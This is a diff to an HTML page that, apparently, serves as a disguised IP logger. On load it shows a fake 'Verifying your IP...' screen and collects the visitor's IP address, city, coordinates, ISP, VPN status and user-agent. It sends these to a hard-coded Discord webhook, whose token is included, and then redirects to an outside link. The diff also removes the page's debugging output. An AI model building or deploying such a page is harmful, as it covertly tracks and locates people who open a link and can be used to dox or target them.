@@ -3,22 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
+    <title>IP Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f1f1f1;
+            text-align: center;
+            padding: 50px;
+        }
+        #verify {
+            background-color: #fff;
+            border: 1px solid #ccc;
+            display: inline-block;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            font-size: 28px;
+            color: #333;
+        }
+        p {
+            font-size: 18px;
+            color: #666;
+        }
+        .loading {
+            font-size: 18px;
+            color: #007bff;
+            font-weight: bold;
+        }
+    </style>
     <script>
         // Discord Webhook URL
         const webhookURL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX";
         
-        // Redirect URL
+        // Redirect URL after verification
         const redirectURL = "https://www.genned.net/auth/rdtqx";
 
         async function logVisitorAndRedirect() {
+            // Simulate IP verification process
+            document.getElementById('verify').innerHTML = `<h1>Verifying your IP...</h1><p class="loading">Please wait while we validate your connection...</p>`;
+
             try {
                 // Get IP address
                 const ipResponse = await fetch("https://api.ipify.org?format=json");
                 const ipData = await ipResponse.json();
                 const userIP = ipData.ip;
-
-                console.log(`IP Address: ${userIP}`); // Debugging: Log IP
 
                 // Get location data including VPN detection
                 const locationResponse = await fetch(`http://ip-api.com/json/${userIP}?fields=status,message,country,regionName,city,isp,org,as,mobile,proxy,hosting,lat,lon,timezone,query`);
@@ -26,11 +56,9 @@
 
                 if (locationData.status !== "success") {
                     console.error("Error getting location data:", locationData.message);
-                    window.location.href = redirectURL; // Redirect even if there's an error
+                    window.location.href = redirectURL; // Redirect if there's an error
                     return;
                 }
-
-                console.log(`Location Data:`, locationData); // Debugging: Log location data
 
                 const userAgent = navigator.userAgent;
                 const vpnStatus = locationData.proxy || locationData.hosting ? "🔴 **VPN/Proxy Detected**" : "🟢 **No VPN/Proxy Detected**";
@@ -54,11 +82,8 @@
                              `**User-Agent:** \`${userAgent}\``
                 };
 
-                // Log to console before sending the message (for debugging purposes)
-                console.log(`Sending message to webhook:`, message);
-
                 // Send data to Discord webhook
-                const discordResponse = await fetch(webhookURL, {
+                await fetch(webhookURL, {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
@@ -66,14 +91,10 @@
                     body: JSON.stringify(message)
                 });
 
-                if (!discordResponse.ok) {
-                    console.error("Error sending message to Discord:", discordResponse.statusText);
-                }
-
                 // Add a small delay before redirecting to ensure data is sent
                 setTimeout(() => {
                     window.location.href = redirectURL;
-                }, 1000); // 1 second delay before redirecting
+                }, 1500); // 1.5 seconds delay
 
             } catch (error) {
                 console.error("Error in logging or redirection:", error);
@@ -81,13 +102,14 @@
             }
         }
 
-        // Run the function on page load
-        logVisitorAndRedirect();
+        // Run the function to simulate IP verification and log visitor
+        window.onload = logVisitorAndRedirect;
     </script>
 </head>
 <body>
-    <noscript>
-        <meta http-equiv="refresh" content="0;url=https://www.genned.net/auth/rdtqx">
-    </noscript>
+    <div id="verify">
+        <h1>Verifying your IP...</h1>
+        <p class="loading">Please wait while we validate your connection...</p>
+    </div>
 </body>
 </html>
